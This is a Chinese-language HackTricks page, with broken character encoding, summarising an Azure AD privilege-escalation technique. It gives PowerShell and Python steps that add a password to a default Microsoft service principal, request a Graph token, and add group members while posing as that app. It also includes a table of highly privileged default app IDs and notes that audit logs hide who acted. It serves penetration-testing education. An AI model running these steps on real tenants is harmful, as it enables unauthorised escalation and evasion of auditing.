# Az - é»˜è®¤åº”ç”¨ç¨‹åº

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

**è¿™æ˜¯åœ¨** [**https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/**](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/) **ä¸­è§£é‡Šçš„æŠ€æœ¯çš„æ€»ç»“**

## åŸºæœ¬ä¿¡æ¯

Azureä¸­åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¸»ä½“ä¹‹é—´çš„åŒºåˆ«ï¼š

* **åº”ç”¨ç¨‹åº**ï¼š**åº”ç”¨ç¨‹åº**çš„é…ç½®
* **æœåŠ¡ä¸»ä½“**ï¼šå®é™…å¯ä»¥åœ¨Azureç›®å½•ä¸­æ‹¥æœ‰**æƒé™**çš„å®‰å…¨å¯¹è±¡

**Azureé—¨æˆ·**å°†æœåŠ¡ä¸»ä½“ç§°ä¸º**"ä¼ä¸šåº”ç”¨ç¨‹åº"**ï¼Œå¹¶ä»è§†å›¾ä¸­**éšè—**äº†æœåŠ¡ä¸»ä½“çš„å¤§å¤šæ•°**å±æ€§**ã€‚

å¯¹äºOffice 365å’Œå…¶ä»–**Microsoftåº”ç”¨ç¨‹åº**ï¼Œ**åº”ç”¨ç¨‹åº**çš„**å®šä¹‰**å­˜åœ¨äºMicrosoftçš„ä¸€ä¸ª**ä¸“ç”¨Azureç›®å½•**ä¸­ã€‚

{% hint style="danger" %}
åœ¨Office 365ç§Ÿæˆ·ä¸­ï¼Œè¿™äº›åº”ç”¨ç¨‹åºçš„æœåŠ¡ä¸»ä½“ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œä½¿å¾—**Office 365 Azure ADé»˜è®¤æ‹¥æœ‰å¤§çº¦200ä¸ªæœåŠ¡ä¸»ä½“ï¼Œå®ƒä»¬éƒ½æœ‰ä¸åŒçš„é¢„åˆ†é…æƒé™**ã€‚
{% endhint %}

## è·å–å¯¹Microsoftåº”ç”¨ç¨‹åºçš„è®¿é—®æƒé™

**åº”ç”¨ç¨‹åºç®¡ç†å‘˜**ï¼ˆæˆ–è€…å¦‚æœæ‚¨æ˜¯ä»æœ¬åœ°å‡çº§åˆ°äº‘ç«¯çš„**æœ¬åœ°åŒæ­¥è´¦æˆ·**ï¼‰å¯ä»¥**ä¸ºåº”ç”¨ç¨‹åºåˆ†é…å‡­æ®**ï¼Œä¹‹åè¿™ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨**å®¢æˆ·ç«¯å‡­æ®æˆæƒ** OAuth2æµç¨‹ç™»å½•ã€‚ä½¿ç”¨PowerShellå¯ä»¥åˆ†é…å‡­æ®ï¼š
```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```
ç„¶åï¼Œæ‚¨å¯ä»¥ç™»å½•å¹¶æŸ¥çœ‹å·²å‘æ”¾çš„è®¿é—®ä»¤ç‰Œã€‚è¿™ä¸ª**JWT æ˜¾ç¤ºäº†åº”ç”¨ç¨‹åºåœ¨ Microsoft Graph ä¸­çš„è§’è‰²**ï¼š
```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
'resource':'https://graph.microsoft.com',
'client_secret':'redactedpassword',
'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
jwtdata = jwt.decode(data2['access_token'], verify=False)
pprint.pprint(jwtdata)
except KeyError:
pass
```
ä»¥ä¸‹å‘½ä»¤å°†æ‰“å°æ¥è‡ªä»¤ç‰Œçš„æ•°æ®ï¼ŒåŒ…å«â€œRolesâ€å­—æ®µï¼š

<pre class="language-json"><code class="lang-json">{
"aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
"app_displayname": "Microsoft StaffHub",
"appid": "aa580612-c342-4ace-9055-8edee43ccb89",
"appidacr": "1",
"aud": "https://graph.microsoft.com",
"exp": 1567200473,
"iat": 1567171373,
"idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"nbf": 1567171373,
"oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
<strong> "roles": ["Directory.ReadWrite.All",
</strong><strong>           "Mail.Read",
</strong><strong>           "Group.Read.All",
</strong><strong>           "Files.Read.All",
</strong><strong>           "Group.ReadWrite.All"],
</strong> "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
"tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
"uti": "2GScBJopwk2e3EFce7pgAA",
"ver": "1.0",
"xms_tcdt": 1559139940
}
</code></pre>

è¿™ç§æ–¹æ³•ä¼¼ä¹åªé€‚ç”¨äº**Microsoft Graph**ï¼ˆä¸é€‚ç”¨äºAzure AD graphï¼‰ã€‚æˆ‘ä¸ç¡®å®šè¿™æ˜¯å› ä¸ºæ²¡æœ‰åº”ç”¨ç¨‹åºåœ¨Azure AD graphä¸Šæœ‰æƒé™ï¼Œè¿˜æ˜¯è¿™äº›æƒé™ä½¿ç”¨çš„ç³»ç»Ÿä¸åŒã€‚

å¦‚æœæˆ‘ä»¬å¯¹Office 365ç§Ÿæˆ·ä¸­çš„æ‰€æœ‰çº¦200ä¸ªé»˜è®¤åº”ç”¨ç¨‹åºæ‰§è¡Œæ­¤æ“ä½œï¼Œæˆ‘ä»¬å°†è·å¾—æ‰€æœ‰è¿™äº›åº”ç”¨ç¨‹åºæ‹¥æœ‰çš„**æƒé™çš„æ¦‚è§ˆ**ã€‚ä¸‹é¢æ˜¯æˆ‘ç¡®å®šçš„æœ€æœ‰è¶£æƒé™çš„æ¦‚è§ˆã€‚

| åº”ç”¨ç¨‹åºåç§°                           | AppId                                | è®¿é—®æƒé™                            |
| ------------------------------------- | ------------------------------------ | ----------------------------------- |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**             |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**           |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**              |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All** |
| Microsoft Teams                       | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**             |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**         |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**             |
| Microsoft.Azure.SyncFabric            | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**             |
| Office 365 Exchange Online            | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**              |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**               |
| Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**               |
| Kaizala Sync Service                  | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**             |

## æ”»å‡»æ€»ç»“

æ‰€ä»¥ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå¦‚æœä½ æ”»ç ´äº†ä¸€ä¸ª**åº”ç”¨ç¨‹åºç®¡ç†å‘˜**è´¦æˆ·æˆ–**æœ¬åœ°åŒæ­¥è´¦æˆ·**ï¼Œä½ å¯ä»¥è¯»å–å’Œ**ä¿®æ”¹ç›®å½•è®¾ç½®ã€ç»„æˆå‘˜èµ„æ ¼ã€ç”¨æˆ·è´¦æˆ·ã€SharePointç«™ç‚¹å’ŒOneDriveæ–‡ä»¶**ã€‚è¿™æ˜¯é€šè¿‡**ä¸ºæ‹¥æœ‰è¿™äº›æƒé™çš„ç°æœ‰æœåŠ¡ä¸»ä½“åˆ†é…å‡­æ®**ï¼Œç„¶åå†’å……è¿™äº›åº”ç”¨ç¨‹åºæ¥å®Œæˆçš„ã€‚

ä½ å¯ä»¥é€šè¿‡**ä¸ºæœåŠ¡ä¸»ä½“åˆ†é…å¯†ç æˆ–**[**è¯ä¹¦**](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) **ï¼Œç„¶åä»¥è¯¥æœåŠ¡ä¸»ä½“èº«ä»½ç™»å½•**æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚æˆ‘ä½¿ç”¨Pythonæ¥ç™»å½•æœåŠ¡ä¸»ä½“å¯†ç ï¼Œå› ä¸ºPowerShellæ¨¡å—ä¸æ”¯æŒè¿™ä¸€ç‚¹ï¼ˆå®ƒæ”¯æŒè¯ä¹¦ï¼Œä½†è®¾ç½®èµ·æ¥æ›´å¤æ‚ï¼‰ã€‚

ä¸‹é¢çš„å‘½ä»¤æ˜¾ç¤ºï¼Œå½“ä½¿ç”¨è¿™æ ·çš„è¯ä¹¦ç™»å½•æ—¶ï¼Œæˆ‘ä»¬ç¡®å®æœ‰æƒä¿®æ”¹ç»„æˆå‘˜èµ„æ ¼ï¼ˆé€šå¸¸åº”ç”¨ç¨‹åºç®¡ç†å‘˜æ²¡æœ‰è¿™ä¸ªæƒé™ï¼‰ï¼š
```powershell
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```
åœ¨Azure ADå®¡è®¡æ—¥å¿—ä¸­ï¼Œæ“ä½œæ˜¾ç¤ºä¸ºç”±â€œMicrosoft StaffHubâ€æ‰§è¡Œï¼Œå› æ­¤æ—¥å¿—ä¸­æ²¡æœ‰ä»»ä½•å†…å®¹è¡¨æ˜è¿™äº›æ“ä½œå®é™…ä¸Šæ˜¯ç”±åº”ç”¨ç¨‹åºç®¡ç†å‘˜æ‰§è¡Œçš„ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
